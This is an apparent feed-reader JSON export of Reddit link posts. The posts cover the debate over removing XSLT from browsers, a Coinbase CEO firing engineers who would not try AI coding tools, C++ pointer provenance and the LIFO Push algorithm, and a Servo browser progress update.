{"id":"i2nisf4o","title":"Reddit","displayTitle":"Reddit","url":"","feedLink":"","isQuery":true,"isEmpty":false,"isHidden":false,"itemCount":173,"items":[{"title":"Video: LibreOffice 25.8 – Some of the new features","url":"https://www.youtube.com/watch?v=6dIRR37PF7M","date":1755938047,"author":"/u/themikeosguy","guid":237241,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1mxw2e2/video_libreoffice_258_some_of_the_new_features/"},{"title":"Upgrading cluster in-place coz I am too lazy to do blue-green","url":"https://www.reddit.com/r/kubernetes/comments/1mxuf5v/upgrading_cluster_inplace_coz_i_am_too_lazy_to_do/","date":1755931848,"author":"/u/suman087","guid":237201,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] Help Suggesting a best model for my sales prediction dataset","url":"https://www.reddit.com/r/MachineLearning/comments/1mxtzj4/d_help_suggesting_a_best_model_for_my_sales/","date":1755930272,"author":"/u/Amjad_Fz","guid":237220,"unread":true,"content":"<p>I’ve got a dataset from an FMCG company with columns like <em>BranchName, RouteName, CustomerCode, ProductCategory, ProductName, Quantity, SaleAmount, BillDate, SalesmanCode</em>.</p><p>Goal: Predict <strong>sales targets for each salesman</strong> based on historical data.</p><p>Can u guys suggest which would perform best for predicting daily targets for Salesman</p>","contentLength":328,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"The linux corner","url":"https://www.reddit.com/r/linux/comments/1mxt6yk/the_linux_corner/","date":1755927463,"author":"/u/Beautiful_Beyond3461","guid":237204,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/Beautiful_Beyond3461\"> /u/Beautiful_Beyond3461 </a>","contentLength":43,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"No, Google Did Not Unilaterally Decide to Kill XSLT","url":"https://meyerweb.com/eric/thoughts/2025/08/22/no-google-did-not-unilaterally-decide-to-kill-xslt/","date":1755926466,"author":"/u/AlyoshaV","guid":237202,"unread":true,"content":"<p>It’s uncommon, but not unheard of, for a GitHub issue to spark an uproar.&nbsp; That happened over the past month or so as the WHATWG (Web Hypertext Application Technology Working Group, which I still say should have called themselves a Task Force instead) issue “<a href=\"https://github.com/WHATWG/html/issues/11523\">Should we remove XSLT from the web platform?</a>” was opened, debated, and eventually locked once the comment thread started spiraling into personal attacks.&nbsp; Other discussions have since opened, such as <a href=\"https://github.com/whatwg/html/issues/11578\"> a counterproposal to update XSLT in the web platform</a>, thankfully with (thus far) much less heat.</p><p>If you’re new to the term, XSLT (Extensible Stylesheet Language Transformations) is an XML language that lets you transform one document tree structure into another.&nbsp; If you’ve ever heard of people styling their RSS and/or Atom feeds to look nice in the browser, they were using some amount of XSLT to turn the RSS/Atom into HTML, which they could then CSS into prettiness.</p><p>This is not the only use case for XSLT, not by a long shot, but it does illustrate the sort of thing XSLT is good for.&nbsp; So why remove it, and who got this flame train rolling in the first place?</p><p>Before I start, I want to note that in this post, I won’t be commenting on whether or not XSLT support should be dropped from browsers or not.&nbsp; I’m also not going to be systematically addressing the various reactions I’ve seen to all this.&nbsp; I have my own biases around this — some of them in direct conflict with each other! — but my focus here will be on what’s happened so far and what might lie ahead.</p><p>As a very quick background, various people have proposed removing XSLT support from browsers a few times over the quarter-century-plus since support first landed.&nbsp; It was discussed in both the early and mid-2010s, for example.&nbsp; At this point, browsers all more or less support<a href=\"https://www.w3.org/TR/xslt-10/\">XSLT 1.0</a>, whereas the latest version of XSLT is <a href=\"https://www.w3.org/TR/xslt-30/\">3.0</a>.&nbsp; I believe they all do so with C++ code, which is therefore not memory-safe, that is baked into the code base rather than supported via some kind of plugged-in library, like Firefox using <a href=\"https://github.com/mozilla/pdf.js\"> PDF.js</a> to support PDFs in the browser.</p><p>Anyway, back on August 1st, Mason Freed of Google opened <a href=\"https://github.com/WHATWG/html/issues/11523\">issue #11523</a> on WHATWG’s HTML repository, asking if XSLT should be removed from browsers and giving a condensed set of reasons why it might be a good idea.&nbsp; He also included a WASM-based polyfill he’d written to provide XSLT support, should browsers remove it, and opened “<a href=\"https://issues.chromium.org/issues/435623334\"> Investigate deprecation and removal of XSLT</a>” in the Chromium bug tracker.</p><p>“So it’s already been decided and we just have to bend over and take the changes our Googlish overlords have decreed!” many people shouted.&nbsp; It’s not hard to see where they got that impression, given some of the things Google has done over the years, but that’s  what’s happening here.&nbsp; Not at this point.&nbsp; I’d like to set some records straight, as an outside observer of both Google and the issue itself.</p><p>First of all, while Mason was the one to open the issue, this was done because the idea was raised in a periodic WHATNOT meeting (call), where someone at Mozilla was actually the one to bring it up, after it had come up in various conversations over the previous few months.&nbsp; After Mason opened the issue, members of the Mozilla and WebKit teams expressed (tentative, mostly) support for the idea of exploring this removal.&nbsp; Basically,  of the vendors are particularly keen on keeping native XSLT support in their codebases, particularly after <a href=\"https://www.neowin.net/news/google-project-zero-exposes-security-flaw-in-libxslt-library-used-in-gnome-applications/\"> security flaws were found</a> in XSLT implementations.</p><p>This isn’t the first time they’ve all agreed it might be nice to slim their codebases down a little by removing something that doesn’t get a lot of use (relatively speaking), and it won’t be the last.&nbsp; I bet they’ve all talked at some point about how nice it would be to remove <a href=\"https://en.wikipedia.org/wiki/BMP_file_format\">BMP</a> support.</p><p>Mason mentioned that they didn’t have resources to put toward updating their XSLT code, and got widely derided for it. “Google has trillions of dollars!” people hooted.&nbsp;  has trillions of dollars.&nbsp; The Chrome team very much does not.&nbsp; They probably get, at best, a tiny fraction of one percent of those dollars.&nbsp; Whether Google should give the Chrome team more money is essentially irrelevant, because that’s not in the Chrome team’s control.&nbsp; They have what they have, in terms of head count and time, and have to decide how those entirely finite resources are best spent.</p><p>(I will once again invoke my late-1900s formulation of <a href=\"https://en.wikipedia.org/wiki/Hanlon's_razor\">Hanlon’s Razor</a>: <em> Never attribute to malice that which can be more adequately explained by resource constraints.</em>)</p><p>Second of all, the issue was opened to start a discussion and gather feedback as the first stage of a multi-step process, one that could easily run for years.&nbsp; Google, as I assume is true for other browser makers, has a pretty comprehensive method for working out whether removing a given feature is tenable or not.&nbsp; <a href=\"https://bkardell.com\">Brian</a> and I <a href=\"https://www.igalia.com/chats/unshipping\"> talked with Rick Byers about it</a> a while back, and I was impressed by both how many things been removed, and what they do to make sure they’re removing the right things.</p><p>Here’s one (by no means the only!) way they could go about this:</p><ol type=\"1\"><li>Set up a switch that allows XSLT to be disabled.</li><li>In the next release of Chrome, use the switch to disable XSLT in one percent of all Chrome downloads.</li><li>See if any bug reports come in about it.&nbsp; If so, investigate further and adjust as necessary if the problems are not actually about XSLT.</li><li>If not, up the percentage of XSLT-disabled downloads a little bit at a time over a number of releases.&nbsp; If no bugs are reported as the percentage of XSLT-disabled users trends toward 100%, then prepare to remove it entirely.</li><li>If, on the other hand, it becomes clear that removing XSLT will be a widely breaking change  — &nbsp;where “widely” can still mean a very tiny portion of their total user base — then XSLT can be re-enabled for all users as soon as possible, and the discussion taken back up with this new information in hand.</li></ol><p>Again, that is just one of several approaches Google could take, and it’s a lot simpler than what they would most likely actually do, but it’s roughly what they default to, as I understand it.&nbsp; The process is slow and deliberate, building up a picture of actual use and user experience.</p><p>Third of all, opening a bug that includes a pull request of code changes isn’t a declaration of countdown to merge, it’s a way of making crystal clear (to those who can read the codebase) exactly what the proposal would entail.&nbsp; It’s basically a requirement for the process of making a decision to start, because it sets the exact parameters of what’s being decided on.</p><p>That said, as a result of all this, I now strongly believe that every proposed-removal issue should point to the process and where the issue stands in it. (And write down the process if it hasn’t been already.) This isn’t for the issue’s intended audience, which was other people within WHATWG who are familiar with the usual process and each other, but for cases of context escape, like happened here.&nbsp; If a removal discussion is going to be held in public, then it should assume the general public will see it and provide enough context for the general public to understand the actual nature of the discussion.&nbsp; In the absence of that context, the nature of the discussion will be assumed, and every assumption will be different.</p><p>There is one thing that we should all keep in mind, which is that “remove from the web platform” really means “remove from browsers”.&nbsp; Even if this proposal goes through, XSLT could still be used server-side.&nbsp; You could use libraries that support XSLT versions more recent than 1.0, even!&nbsp; Thus, XML could still be turned into HTML, just not in the client via native support, though JS or WASM polyfills, or even add-on extensions, would still be an option.&nbsp; Is that good or bad?&nbsp; Like everything else in our field, the answer is “it depends”.</p><p>Just in case your eyes glazed over and you quickly skimmed to see if there was a TL;DR, here it is:</p><p><em>The discussion was opened by a Google employee in response to interest from multiple browser vendors in removing built-in XSLT, following a process that is opaque to most outsiders.&nbsp; It’s a first step in a multi-step evaluation process that can take years to complete, and whose outcome is not predetermined.&nbsp; Tempers flared and the initial discussion was locked; the conversation continues elsewhere.&nbsp; There are good reasons to drop native XSLT support in browsers, and also good reasons to keep or update it, but XSLT is not itself at risk.</em></p>","contentLength":8626,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mxswpp/no_google_did_not_unilaterally_decide_to_kill_xslt/"},{"title":"Coinbase CEO explains why he fired engineers who didn’t try AI immediately","url":"https://techcrunch.com/2025/08/22/coinbase-ceo-explains-why-he-fired-engineers-who-didnt-try-ai-immediately/","date":1755924216,"author":"/u/diegoargento1","guid":237191,"unread":true,"content":"<p>It’s hard to find programmers these days who aren’t using AI coding assistants in some capacity, especially to write the repetitive, mundane bits.</p><p>But those who refused to try the tools when Coinbase bought enterprise licenses for GitHub Copilot and Cursor got promptly fired, CEO Brian Armstrong said this week on John Collison’s podcast <a href=\"https://www.youtube.com/watch?v=JeVny5KHj4g&amp;list=PLcoWp8pBTM3ATMYLP-hFIhJORSw-nFOiY&amp;index=2\" target=\"_blank\" rel=\"noreferrer noopener nofollow\">“Cheeky Pint.”</a> (Collison is the co-founder and president of the payments company Stripe.)</p><p>After getting licenses to cover every engineer, some at the cryptocurrency exchange warned Armstrong that adoption would be slow, predicting it would take months to get even half the engineers using AI.&nbsp;</p><p>Armstrong was shocked at the thought. “I went rogue,” he said, and posted a mandate in the company’s main engineering Slack channel. “I said, ‘AI is important. We need you to all learn it and at least onboard. You don’t have to use it every day yet until we do some training, but at least onboard by the end of the week. And if not, I’m hosting a meeting on Saturday with everybody who hasn’t done it and I’d like to meet with you to understand why.’”&nbsp;</p><p>At the meeting, some people had reasonable explanations for not getting their AI assistant accounts set up during the week, like being on vacation, Armstrong said.</p><p>“I jumped on this call on Saturday and there were a couple people that had not done it. Some of them had a good reason, because they were just getting back from some trip or something, and some of them didn’t [have a good reason]. And they got fired.”</p><p>Armstrong admits that it was a “heavy-handed approach” and there were people in the company who “didn’t like it.”</p><p>While it doesn’t sound like very many people were fired, Armstrong said it sent a clear message that AI is not optional. Still, everything about that story is wild: that there were engineers who wouldn’t spend a few minutes of their week signing up for and testing the AI assistant — the most hyped tech for coders ever — and that Armstrong was willing to fire them over it.</p><p>Coinbase did not respond to a request for comment.</p><p>Since then, Armstrong has leaned further into the training. He said the company hosts monthly meetings where teams who have mastered creative ways to use AI share what they have learned.</p><p>Interestingly, Collison, who has been <a href=\"https://fintechmagazine.com/articles/the-collison-brothers\" target=\"_blank\" rel=\"noreferrer noopener nofollow\">programming since childhood</a>, questioned how much companies should be relying on AI-generated code.</p><p>“It’s clear that it is very helpful to have AI helping you write code. It’s not clear how you run an AI-coded code base,” he commented.  Armstrong replied, “I agree.”</p><p>Indeed, as TechCrunch previously reported, <a href=\"https://techcrunch.com/2025/07/15/a-former-openai-engineer-describes-what-its-really-like-to-work-there/\">a former OpenAI engineer described</a> that company’s central code repository as “a bit of a dumping ground.” The engineer said management had begun dedicating engineering resources to improve the situation.</p><p><em>We’re always looking to evolve, and by providing some insight into your perspective and feedback into TechCrunch and our coverage and events, you can help us! Fill out&nbsp;</em><em>&nbsp;to let us know how we’re doing and get the chance to win a prize in return!</em></p>","contentLength":3093,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mxs92h/coinbase_ceo_explains_why_he_fired_engineers_who/"},{"title":"What on Earth Does Pointer Provenance Have to do With RCU?","url":"https://people.kernel.org/paulmck/what-on-earth-does-lifetime-end-pointer-zap-have-to-do-with-rcu","date":1755923066,"author":"/u/unixbhaskar","guid":237221,"unread":true,"content":"<p>TL;DR: Unless you are doing very strange things with RCU, not much!!!</p><p>So why has the guy most responsible for Linux-kernel spent so much time over the past five years working on the provenance-related lifetime-end pointer zap within the C++ Standards Committee?</p><h2>What is Pointer Provenance?</h2><p>Back in the old days, provenance was for objets d'art and the like, and we did not need them for our pointers, no sirree!!!  Pointers had bits, those bits formed memory addresses, and as often as not we didn't even need to worry about these addresses being translated.  But life is more complicated now.  On the other hand, computing life is also much bigger, faster, more reliable, and (usually) more productive, so be extremely careful what you wish for from back in the Good Old Days!</p><p>These days, pointers have provenance as well as addresses, and this has consequences.  The C++ Standard  (<a href=\"https://www.open-std.org/jtc1/sc22/wg21/docs/papers/2025/n5008.pdf\" rel=\"nofollow\">recent draft</a>) states that when an object's storage duration ends, any pointers to that object become invalid.  For its part, the C Standard states that when an object's storage duration ends, any pointers to that object become indeterminate.  In both standards, the wording is more precise, but this will serve for our purposes.</p><p>For the remainder of this document, we will follow C++ and say “invalid”, which is shorter than “indeterminate”.  We will balance this out by using C-language example code.  Those preferring C++ will be happy to hear that this is the language that I use in my <a href=\"https://cppcon2025.sched.com/event/27bR6/interesting-upcoming-low-latency-concurrency-and-parallelism-features-from-wroclaw-2024-hagenberg-2025-and-sofia-2025\" rel=\"nofollow\">upcoming CPPCON presentation</a>.</p><p>Neither standard places any constraints on what a compiler can do with an invalid pointer value, even if all you are doing is loading or storing that value.</p><p>Those of us who cut our teeth on assembly language might quite reasonably ask why anyone would even think to make pointers so invalid that you cannot even load or store them.  Let's start by looking at pointer comparisons using this code fragment:</p><pre><code>p = kmalloc(...);\nmight_kfree(p);         // Pointer might become invalid (AKA \"zapped\")\nq = kmalloc(...);       // Assume that the addresses of p and q are equal.\nif (p == q)             // Compiler can optimize as \"if (false)\"!!!\n    do_something();\n</code></pre><p>Both  and  contain addresses, but the compiler also keeps track of the fact that their values were obtained from different invocations of .  This information forms part of each pointer's provenance.  This means that  and  have different provenance, which in turn means that the compiler does not need to generate any code for the  comparison.  The two pointers' provenance differs, so the result cannot be anything other than .</p><p>And this is one motivation for pointer provenance and invalidity:  The results of operations on invalid pointers are not guaranteed, which provides additional opportunities for optimization.  This example perhaps seems a bit silly, but modern compilers can use pointer provenance and invalidity to carry out serious points-to and aliasing analysis.</p><p>Yes, you can have hardware provenance.  Examples include ARM MTE, the CHERI research prototype (which last I checked had issues with C++'s requirement that pointers are trivially copiable), and the venerable IBM System i.  Conventional systems provide pointer provenance of a sort via their page tables, which is used by a variety of memory-allocation-use debuggers, for but one example, the efence library.  The pointer-provenance features of ARM MTE and IBM System i are not problematic, but last I checked, the jury was still out on CHERI.</p><p>Of course, using invalid (AKA “dangling”) pointers is known to be a bad idea.  So why are we even talking about it???</p><h2>Why Would Anyone Use Invalid/Dangling Pointers?</h2><p>Please allow me to introduce you to the famous and frequently re-invented LIFO Push algorithm.  You can find this in many places, but let's focus on the Linux kernel's  and  functions.  The former atomically pushes a list of elements on a linked-list stack, and the latter just as atomically removes the entire contents of the stack:</p><pre><code>static inline bool llist_add_batch(struct llist_node *new_first,\n                                   struct llist_node *new_last,\n                                   struct llist_head *head)\n{\n    struct llist_node *first = READ_ONCE(head-&gt;first);\n\n    do {\n        new_last-&gt;next = first;\n    } while (!try_cmpxchg(&amp;head-&gt;first, &amp;first, new_first));\n\n    return !first;\n}\n\nstatic inline struct llist_node *llist_del_all(struct llist_head *head)\n{\n    return xchg(&amp;head-&gt;first, NULL);\n}\n</code></pre><p>As lockless concurrent algorithms go, this one is pretty straightforward.  The  function reads the list header, fills in the  pointer, then does a compare-and-exchange operation to point the list header at the new first element.  The  function is even simpler, doing a single atomic exchange operation to  out the list header and returning the elements that were previously on the list.  This algorithm also has excellent forward-progress properties: the  function is lock-free and the  function is wait-free.</p><p>In assembly language, or with a simple compiler, not much.  But to see the pointer-provenance issue with more heavily optimized languages, consider the following sequence of events:</p><ol><li>CPU 0 allocates an  B and passes it via both the  and  parameters of .</li><li>CPU 0 picks up the  pointer and places it in the  local variable, then assigns it to .  This  pointer now references  A.</li><li>CPU 1 invokes , which returns a list containing  A.  The caller of  processes A and passes it to .</li><li>CPU 0's  pointer is now invalid due to  A having been freed.  But CPU 0 does not know this.</li><li>CPU 1 allocates an  C that happens to have the same address as the old  A.  It passes C  via both the  and  parameters of , which runs to completion.  The  pointer now points to  C, which happens to have the same address as the now storage-duration-ended  A.</li><li>CPU 0 finally gets around to executing its , which given typical C compilers will succeed.  The  now contains an  B that contains an invalid pointer to dead  A, but whose pointer address happens to reference the shiny new  C.  (We term this invalid pointer a “zombie pointer” because it has in some assembly-language sense come back from the dead.)</li><li>Some CPU invokes  and gets back an  containing an invalid pointer.</li></ol><p>One could argue that the Linux-kernel implementation of LIFO Push is simply buggy and should be fixed.  Except that there is no reasonable way to fix it.  Which of course raises the question...</p><h2>What Are Unreasonable Fixes?</h2><p>We can protect pointers from invalidity by storing them as integers, but:</p><ol><li>Suppose someone has an element that they are passing to a library function.  They should not be required to convert all their  pointers to integer just because the library's developers decide to switch to the LIFO Push algorithm for some obscure internal operation.</li><li>In addition, switching to integer defeats type-checking, because integers are integers no matter what type of pointer they came from.</li><li>We could restore some type-checking capability by wrapping the integer into a differently named struct for each pointer type.  Except that this requires a struct with some particular name to be treated as compatible with pointers of some type corresponding to that name, a notion that current do not support.</li><li>In C++, we could use template metaprogramming to wrap an integer into a class that converts automatically to and from compatibly typed pointers.  But there would then be windows of time in which there was a real pointer, and at that time there would still be the possibility of pointer invalidity.</li><li>All of the above hack-arounds put additional obstacles in the way of developers of concurrent software.</li><li>In environments such as the Linux kernel that provides their own memory allocators, we can hide them from the compiler.  But this is not free, in fact, the patch that exposed the Linux-kernel's memory allocators to the compiler resulted in a small but significant improvement.</li></ol><p>However, it is fair to ask...</p><h2>Why Do We Care About Strange New Algorithms???</h2><p>Let's take a look at the history, courtesy of Maged Michael's diligent software archaeology.</p><p>In 1986, R. K. Treiber presented an assembly language implementation of the LIFO Push algorithm in technical report RJ 5118 entitled “Systems Programming: Coping with Parallelism” while at the IBM Almaden Research Center.</p><p><a href=\"https://patents.google.com/patent/US3886525\" rel=\"nofollow\">US Patent 3,886,525</a> was filed in June 1973, just a few months before I wrote my first line of code, and contains a prior-art reference to the LIFO Push algorithm (again with pop() instead of popall()) as follows: “Conditional swapping of a single address is sufficient to program a last-in, first-out single-user-at-a-time sequencing mechanism.”  (If you were to ask a patent attorney, you would likely be told that this 50-year-old patent has long since expired.  Which should be no surprise, given that it is even older than Dennis Ritchie's setuid <a href=\"https://patents.google.com/patent/US4135240A/en\" rel=\"nofollow\">Patent 4,135,240</a>.)</p><p>All three of these references describe LIFO push as if it was straightforward and well known.</p><p>So we don’t know who first invented LIFO Push or when they invented it, but it was well known in 1973.  Which is well over a decade before C was first standardized, more than two decades before C++ was first standardized, and even longer before work was started on Rust.</p><p>And its combination of (relative) simplicity and excellent forward-progress properties just might be why this algorithm was anonymously invented so long ago and why it is so persistently and repeatedly reinvented.  This frequent reinvention puts paid to any notion that LIFO Push is strange.</p><p>So sorry, but LIFO Push is neither new nor strange.</p><p>The lifetime-end pointer-zap story is not yet over, but we are currently pushing for the changes in four working papers.</p><h3>Nondeterministic Pointer Provenance</h3><p><a href=\"https://isocpp.org/files/papers/P2434R4.html\" rel=\"nofollow\">P2434R4 (“Nondeterministic pointer provenance”)</a> is the basis for the other three papers.  It asks that when converting a pointer to an integer and back, the implementation must choose a qualifying pointed-to object (if there is one) whose storage duration began before or concurrently with the conversion back to a pointer.  In particular, the implementation is free to ignore a qualifying pointed-to object when the conversion to pointer happens before the beginning of that object’s storage duration.</p><p>The “qualifying” qualifier includes compatible type, as well as sufficiently early and long storage duration.</p><p>But why restrict the qualifying pointed-to object's storage duration to begin before or concurrently with the conversion back to a pointer?</p><p>An instructive example by Hans Boehm may be found in P2434R4, which shows that reasonable (and more important, very heavily used) optimizations would be invalidated by this approach.  Several examples that manage to be even more sobering may be found in David Goldblatt's <a href=\"https://www.open-std.org/jtc1/sc22/wg21/docs/papers/2024/p3292r0.html\" rel=\"nofollow\">P3292R0 (“Provenance and Concurrency”)</a>.</p><h3>Pointer Lifetime-End Zap Proposed Solutions: Atomics and Volatile</h3><p><a href=\"https://www.open-std.org/jtc1/sc22/wg21/docs/papers/2025/p2414r9.pdf\" rel=\"nofollow\">P2414R10 (“Pointer lifetime-end zap proposed solutions: Atomics and volatile”)</a> is motivated by the observation that atomic pointers are subject to update at any time by any thread, which means that the compiler cannot reasonably do much in the way of optimization.  This paper therefore asks (1) that atomic operations be redefined to yield and to store prospective pointers values and (2) that operations on volatile pointers be defined to yield and to store prospective pointer values.  The effect is as if atomic pointers were stored internally as integers. This includes the “old” pointer passed by reference to compare_exchange().</p><p>This helps, but is not a full solution because atomic pointers are converted to non-atomic pointers prior to use, at which point they are subject to lifetime-end pointer zap.  And the standard does not even guarantee that a zapped pointer can even be loaded, stored, passed to a function, or returned from a function.  Which brings us to the next paper.</p><h3>Pointer Lifetime-End Zap Proposed Solutions: Tighten IDB for Invalid Pointers</h3><p><a href=\"https://www.open-std.org/jtc1/sc22/wg21/docs/papers/2025/p3347r3.pdf\" rel=\"nofollow\">P3347R3 (“Pointer lifetime-end zap proposed solutions: Tighten IDB for invalid pointers”)</a> therefore asks that all non-comparison non-arithmetic non-dereference computations involving pointers, specifically including normal loads and stores, are fully defined even if the pointers are invalid.  This permits invalid pointers to be loaded, stored, passed as arguments, and returned.  Fully defining comparisons would rule out optimizations, and fully defining arithmetic would be complex and thus far unneeded.</p><p>If these first three papers are accepted into the standard, the C++ implementation of LIFO Push show above becomes valid code.  This is important because this algorithm has been re-invented many times over the past half century, and is often open coded.  This makes it very hard to construct tools that find LIFO Push implementations in existing code.</p><h3>P3790R1: Pointer Lifetime-End Zap Proposed Solutions: Bag-of-Bits Pointer Class</h3><p><a href=\"https://www.open-std.org/jtc1/sc22/wg21/docs/papers/2025/p3790r0.pdf\" rel=\"nofollow\">P3790R1 (“Pointer lifetime-end zap proposed solutions: Bag-of-bits pointer class”)</a> asks that (1) the addition to the C++ standard library of the function <code>launder_bag_of_bits_ptr()</code> that takes a pointer argument and returns a prospective pointer value corresponding to its argument; and (2) the addition to the C++ standard library of the class template  that is a pointer-like type that is still usable after the pointed-to object’s lifetime has ended.  Of course, such a pointer still cannot be dereferenced unless there is a live object at that pointer's address.  Furthermore, some systems, such as ARMv9 with memory tagging extensions (MTE) enabled have provenance as well as address bits in the pointer, and on such systems dereferencing will fail unless the pointer's provenance bits happen to match those of the pointed-to object.</p><p>This function and template class is nevertheless quite useful for maintaining hash maps keyed by pointers after the pointed-to object's lifetime has ended.</p><p>Unlike LIFO Push, source-code changes are required for these use cases.  This is unfortunate, but we have thus far been unable to come up with a same-source-code approach.</p><p>Those who have participated in standards work (or even open-source work) will understand that the names <code>launder_bag_of_bits_ptr()</code> and  are still subject to bikeshedding.</p><h2>A Happen Lifetime-End Pointer Zap Ending?</h2><p>It is still too early to say for certain, but thus far these proposals are making much better progress than did their predecessors.  So who knows?  Perhaps C++29 will address lifetime-end pointer zap.</p>","contentLength":14444,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1mxrwl4/what_on_earth_does_pointer_provenance_have_to_do/"},{"title":"[D] AAAI considered 2nd tier now?","url":"https://www.reddit.com/r/MachineLearning/comments/1mxrt1y/d_aaai_considered_2nd_tier_now/","date":1755922751,"author":"/u/Healthy_Horse_2183","guid":237203,"unread":true,"content":"<div><p>Isn’t AAAI in the same tier as NeurIPS/ICML/ICLR? ICLR literally has &gt;30% acceptance rate.</p></div>   submitted by   <a href=\"https://www.reddit.com/user/Healthy_Horse_2183\"> /u/Healthy_Horse_2183 </a>","contentLength":133,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"This month in Servo: new image formats, canvas backends, automation, and more!","url":"https://servo.org/blog/2025/08/22/this-month-in-servo/","date":1755914332,"author":"/u/KlasySkvirel","guid":237186,"unread":true,"content":"<p>Servo has smashed its record again in July, with  landing in our nightly builds!\nThis includes several new web platform features:</p><p>Notable changes for Servo library consumers:</p><p>Like many browsers, Servo has two kinds of zoom:  affects the size of the viewport, while  does not (<a href=\"https://github.com/shubhamg13\">@shubhamg13</a>, <a href=\"https://github.com/servo/servo/pull/38194\">#38194</a>).\n now correctly triggers reflow (<a href=\"https://github.com/mrobinson\">@mrobinson</a>, <a href=\"https://github.com/servo/servo/pull/38166\">#38166</a>), and  is now reset to the viewport meta config when navigating (<a href=\"https://github.com/shubhamg13\">@shubhamg13</a>, <a href=\"https://github.com/servo/servo/pull/37315\">#37315</a>).</p><p> is now isolated between webviews, and copied to new webviews with the same  (<a href=\"https://github.com/janvarga\">@janvarga</a>, <a href=\"https://github.com/servo/servo/pull/37803\">#37803</a>).</p><p> now has a  and , so you can now  on Linux (<a href=\"https://github.com/MichaelMcDonnell\">@MichaelMcDonnell</a>, <a href=\"https://github.com/servo/servo/pull/38038\">#38038</a>).\nWe’ve made it more ergonomic too, fixing both the sluggish  and <strong>pixel-perfect trackpad scrolling</strong> and the too fast  (<a href=\"https://github.com/yezhizhen\">@yezhizhen</a>, <a href=\"https://github.com/servo/servo/pull/37982\">#37982</a>).</p><p> is key to programmable graphics on the web, with Servo supporting WebGPU, WebGL, and 2D canvas contexts.\nBut the <strong>general-purpose 2D graphics</strong> routines that power Servo’s 2D canvases are potentially useful for a lot more than &lt;canvas&gt;:  is bread and butter for Servo, but  is only minimally supported right now, and  is not yet implemented at all.</p><p>Those features have one thing in common: they require things that WebRender can’t yet do.\n does one thing and does it well: rasterise the layouts of the web, really fast, by <a href=\"https://hacks.mozilla.org/2017/10/the-whole-web-at-maximum-fps-how-webrender-gets-rid-of-jank/\">using the GPU as much as possible</a>.\nFont rendering and SVG rendering both involve rasterising arbitrary paths, which currently has to be done outside WebRender, and PDF output is out of scope entirely.</p><p>The more code we can share between these tasks, the better we can make that code, and the smaller we can make Servo’s binary sizes (<a href=\"https://github.com/servo/servo/issues/38022\">#38022</a>).\nWe’ve started by moving 2D-&lt;canvas&gt;-specific state out of the  crate (<a href=\"https://github.com/sagudev\">@sagudev</a>, <a href=\"https://github.com/servo/servo/pull/38098\">#38098</a>, <a href=\"https://github.com/servo/servo/pull/38114\">#38114</a>, <a href=\"https://github.com/servo/servo/pull/38164\">#38164</a>, <a href=\"https://github.com/servo/servo/pull/38214\">#38214</a>), which has in turn allowed us to modernise it with <strong>new backends based on <a href=\"https://github.com/linebender/vello\">Vello</a></strong> (<a href=\"https://github.com/EnnuiL\">@EnnuiL</a>, <a href=\"https://github.com/sagudev\">@sagudev</a>, <a href=\"https://github.com/servo/servo/issues/30636\">#30636</a>, <a href=\"https://github.com/servo/servo/issues/38345\">#38345</a>):</p><ul><li><p>a Vello GPU-based backend (<a href=\"https://github.com/sagudev\">@sagudev</a>, <a href=\"https://github.com/servo/servo/pull/36821\">#36821</a>), currently slower than the default backend; to use it, build Servo with  and enable it with <code>--pref dom_canvas_vello_enabled</code></p></li><li><p>a Vello CPU-based backend (<a href=\"https://github.com/sagudev\">@sagudev</a>, <a href=\"https://github.com/servo/servo/pull/38282\">#38282</a>), <strong>already faster than the default backend</strong>; to use it, build Servo with  and enable it with <code>--pref dom_canvas_vello_cpu_enabled</code></p></li></ul><p>Many recent Servo bugs have been related to our handling of , , and  (<a href=\"https://github.com/servo/servo/issues/36817\">#36817</a>, <a href=\"https://github.com/servo/servo/issues/37804\">#37804</a>, <a href=\"https://github.com/servo/servo/issues/37824\">#37824</a>, <a href=\"https://github.com/servo/servo/issues/37878\">#37878</a>, <a href=\"https://github.com/servo/servo/issues/37978\">#37978</a>, <a href=\"https://github.com/servo/servo/issues/38089\">#38089</a>, <a href=\"https://github.com/servo/servo/issues/38090\">#38090</a>, <a href=\"https://github.com/servo/servo/issues/38093\">#38093</a>, <a href=\"https://github.com/servo/servo/issues/38255\">#38255</a>).\nSymptoms of these bugs include  (e.g. links that can’t be clicked),  to the end of the page, or  like disappearing browser UI or black bars.</p><p>Windows rarely take up the whole screen, viewports rarely take up the whole window due to window decorations, and when different units come into play, like CSS  vs device pixels, a more systematic approach is needed.\nWe built <a href=\"https://docs.rs/euclid/0.22.11/euclid/\"></a> to solve these problems in a strongly typed way within Servo, but beyond the viewport, we need to convert between euclid types and the geometry types provided by the embedder, the toolkit, the platform, or WebDriver, which creates opportunities for errors.</p><p>Servo is also on <a href=\"https://thanks.dev\">thanks.dev</a>, and already  (−3 from June) that depend on Servo are sponsoring us there.\nIf you use Servo libraries like <a href=\"https://crates.io/crates/url/reverse_dependencies\">url</a>, <a href=\"https://crates.io/crates/html5ever/reverse_dependencies\">html5ever</a>, <a href=\"https://crates.io/crates/selectors/reverse_dependencies\">selectors</a>, or <a href=\"https://crates.io/crates/cssparser/reverse_dependencies\">cssparser</a>, signing up for <a href=\"https://thanks.dev\">thanks.dev</a> could be a good way for you (or your employer) to give back to the community.</p><p>As always, use of these funds will be decided transparently in the Technical Steering Committee.\nFor more details, head to our <a href=\"https://servo.org/sponsorship/\">Sponsorship page</a>.</p>","contentLength":3367,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1mxp3nt/this_month_in_servo_new_image_formats_canvas/"},{"title":"[D] Where are the AI startups working with diffusion 